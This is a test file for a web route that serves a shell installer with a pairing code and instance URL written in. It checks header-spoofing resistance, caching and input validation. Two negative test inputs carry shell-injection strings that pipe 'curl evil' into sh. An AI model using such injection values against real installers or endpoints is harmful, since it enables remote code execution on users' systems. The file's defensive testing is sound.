import { readFile } from "node:fs/promises";
import { resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { GET } from "./route";

const canonical = () => readFile(resolve(process.cwd(), "../../install.sh"), "utf8");

function request(url: string, headers: Record<string, string> = {}): Request {
  return new Request(url, { headers: { host: "board.example", ...headers } });
}

describe("GET /install.sh", () => {
  it("serves the canonical root installer as shell text", async () => {
    const response = await GET(request("https://board.example/install.sh"));

    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toContain("text/x-shellscript");
    expect(await response.text()).toBe(await canonical());
    expect(response.headers.get("cache-control")).toBe("public, max-age=300");
  });
});

describe("GET /install.sh?code=NNNNNN", () => {
  // The instance address written into the script comes from the operator's
  // OVERCLICK_PUBLIC_URL, never from Host or x-forwarded-*, which the caller writes.
  beforeEach(() => {
    process.env.OVERCLICK_PUBLIC_URL = "https://board.example";
  });
  afterEach(() => {
    delete process.env.OVERCLICK_PUBLIC_URL;
  });

  it("answers the instance and the code the script would otherwise ask for", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();

    expect(body).toContain('OVERCLICK_INSTANCE_URL="${OVERCLICK_INSTANCE_URL:-https://board.example}"');
    expect(body).toContain('OVERCLICK_PAIRING_CODE="${OVERCLICK_PAIRING_CODE:-482913}"');
    expect(body).toContain("export OVERCLICK_INSTANCE_URL OVERCLICK_PAIRING_CODE");
  });

  it("keeps the shebang first, so a saved copy is still executable", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();

    expect(body.split("\n")[0]).toBe("#!/usr/bin/env bash");
  });

  it("leaves the rest of the installer byte-for-byte alone", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();
    const original = await canonical();

    // Everything the installer is, minus its shebang, has to survive intact:
    // the route presents the script, it does not get to rewrite it.
    expect(body).toContain(original.slice(original.indexOf("\n") + 1));
  });

  it("never lets a proxy hand the same single-use code to the next caller", async () => {
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    expect(response.headers.get("cache-control")).toBe("no-store, private");
  });

  it("ignores Host and the forwarded headers: the address is the configured one", async () => {
    const response = await GET(
      request("https://evil.example/install.sh?code=482913", {
        host: "evil.example",
        "x-forwarded-host": "evil.example",
        "x-forwarded-proto": "http",
      }),
    );
    const body = await response.text();
    expect(body).toContain(":-https://board.example}");
    expect(body).not.toContain("evil.example");
  });

  it("writes only the origin of the configured address, not a path or credentials", async () => {
    process.env.OVERCLICK_PUBLIC_URL = "https://board.example/some/path?x=1";
    const body = await (await GET(request("https://board.example/install.sh?code=482913"))).text();
    expect(body).toContain(":-https://board.example}");
    expect(body).not.toContain("some/path");
  });

  it("keeps http for a configured local address, the one case that is not TLS", async () => {
    process.env.OVERCLICK_PUBLIC_URL = "http://localhost:3000";
    const response = await GET(request("http://localhost:3000/install.sh?code=482913", { host: "localhost:3000" }));
    expect(await response.text()).toContain(":-http://localhost:3000}");
  });

  it("serves no paired installer when OVERCLICK_PUBLIC_URL is unset", async () => {
    delete process.env.OVERCLICK_PUBLIC_URL;
    const original = await canonical();
    const response = await GET(request("https://board.example/install.sh?code=482913"));
    const body = await response.text();

    expect(body).toBe(original);
    expect(body).not.toContain("482913");
    expect(response.headers.get("cache-control")).toBe("public, max-age=300");
  });

  it("serves no paired installer when OVERCLICK_PUBLIC_URL is not a plain origin", async () => {
    const original = await canonical();
    for (const value of [
      "not a url",
      "ftp://board.example",
      "http://board.example",
      "https://user:pw@board.example",
      'https://board.example";curl evil|sh;#',
    ]) {
      process.env.OVERCLICK_PUBLIC_URL = value;
      const response = await GET(request("https://board.example/install.sh?code=482913"));
      expect(await response.text()).toBe(original);
    }
  });

  it("ignores anything that is not exactly six digits", async () => {
    const original = await canonical();
    for (const code of ["", "12345", "1234567", "abcdef", "12345a", '1"; curl evil #']) {
      const response = await GET(
        request(`https://board.example/install.sh?code=${encodeURIComponent(code)}`),
      );
      expect(await response.text()).toBe(original);
    }
  });
});
